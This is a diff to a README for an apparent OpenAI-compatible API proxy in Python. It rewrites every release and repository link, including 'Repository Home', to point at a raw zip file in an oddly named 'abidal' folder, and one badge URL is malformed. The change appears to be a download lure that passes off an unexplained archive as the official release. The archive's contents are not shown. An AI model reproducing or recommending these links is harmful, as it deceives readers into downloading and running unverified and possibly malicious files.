@@ -6,7 +6,7 @@ Welcome to the OpenAI-Compatible-API-Proxy-for-Z-python repository. This applica
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-OpenAI--Compatible--API--Proxy--for--Z--Python-blue.svg)](https://github.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/releases)
+[![Download Here](https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip%https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip)](https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
 
 ## 📋 System Requirements
 
@@ -22,7 +22,7 @@ Before you download, ensure your system meets the following requirements:
 To install the OpenAI-Compatible-API-Proxy-for-Z-python, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/releases) to find the latest version.
+   Go to the [Releases page](https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip) to find the latest version.
 
 2. **Select the Latest Release**  
    Look at the list of available versions. Choose the newest one for the best experience.
@@ -75,8 +75,8 @@ Yes, as long as your computer meets the requirements mentioned above, you can ru
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/releases)
-- [Repository Home](https://github.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python)
+- [Releases Page](https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
+- [Repository Home](https://raw.githubusercontent.com/Rawitkara/OpenAI-Compatible-API-Proxy-for-Z-python/main/abidal/OpenAI-Compatible-API-Proxy-for-Z-python.zip)
 
 ## 📞 Support
 
